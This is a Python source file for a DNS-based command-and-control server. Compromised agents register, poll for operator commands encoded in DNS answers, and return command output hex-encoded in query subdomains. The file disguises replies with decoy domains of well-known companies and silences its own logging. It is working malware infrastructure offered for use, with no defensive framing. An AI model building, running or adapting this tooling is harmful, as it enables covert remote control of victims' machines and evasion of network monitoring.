from dnslib import DNSRecord
from dnslib.server import DNSServer, DNSLogger
from dnslib.dns import RR

import base64, time, random

# Exerpts https://paktek123.medium.com/write-your-own-dns-server-in-python-hosted-on-kubernetes-3febacf33b9b
# which takes from https://github.com/paulc/dnslib/blob/master/dnslib/server.py

a_database_of_every_client = []
command = ""

port = 53 # port this lives on
address = "127.0.0.1" # ip address this lives on
freq = 10 + 1 # how long to wait for commands to propagate

# Generate no-op domains for obfuscation.
def random_nop(subdomain=False):
    domains = [
        "google.com",
        "youtube.com",
        "stackoverflow.com",
        "microsoft.com",
        "facebook.com",
        "amazon.com",
        "oracle.com",
        "bing.com",
        "slack.com",
        "duckduckgo.com"
    ]

    # Subdomain Mode.
    if subdomain:
        subs = ["docs.", "admin.", "dev.", "faq.", "www.", "help.", "cloud.", "my.", ""]
        return subs[random.randint(0, len(subs) - 1)] + domains[random.randint(0, len(domains) - 1)]

    return domains[random.randint(0, len(domains) - 1)]

# Register a user.
def add_user(ip):
    client_id = len(a_database_of_every_client)

    # inefficient but idc
    i = 0
    for entry in a_database_of_every_client:
        if (entry['ip'] == ip):
            return i
        else:
            i += 1

    a_database_of_every_client.append({
        "ip": ip
    })

    return client_id

# Build a response query
def build(req, body):
    reply = req.reply()
    reply.add_answer(*RR.fromZone(body + ". 60 A 0.0.0.0"))
    return reply

# Process a question sent by agents
def execute(req, ip):
    domain = str(req.get_q().get_qname())[:-1]
    data = domain.split(".")

    # init.
    if data[0] == "init":
        client_id = add_user(ip)
        return build(req, "success." + random_nop())

    # resp.<data>.
    elif data[0] == "resp":
        # print(data[1])
        hex_code = base64.b16decode(data[1].upper()).decode("utf8")
        print(f"<{ip}> {hex_code}")
        return build(req, "success." + random_nop())

    # update.
    elif data[0] == "update":
        if command == "":
            return build(req, domain)
        else:
            # run.<command>.
            return build(req, "run." + base64.b16encode(command.encode("utf8")).decode("utf8").lower() + "." + domain)

    # NOP
    else:
        firstChar = str(domain)[0]
        if firstChar == "0" or firstChar == "1" or firstChar == "2" or firstChar == "3" or firstChar == "4" or firstChar == "5" or firstChar == "6" or firstChar == "7" or firstChar == "8" or firstChar == "9":
            return build(req, random_nop(subdomain=True))

        return build(req, domain)

# DNS server resolver class.
class C2Resolver:
    def resolve(self, req, handler):
        ip = handler.client_address[0] # gets the IP

        return execute(req, ip)

# Supress logs
class C2Logger:
    def log_recv(self,handler,data):
        pass

    def log_send(self,handler,data):
        pass

    def log_request(self,handler,request):
        pass

    def log_reply(self,handler,reply):
        pass

    def log_truncated(self,handler,reply):
        pass

    def log_error(self,handler,e):
        pass

    def log_data(self,dnsobj):
        pass


# Start the DNS server
resolver = C2Resolver()
logger = C2Logger()

srv = DNSServer(resolver, port=port, address=address, logger=logger, tcp=False)

srv.start_thread()

# A pretty console to read stuff! ^_^
while True:
    data = input("> ")

    if data == "exit":
        break
    elif data == "print":
        print(a_database_of_every_client)
    else:
        command = data
        time.sleep(freq)
        command = ""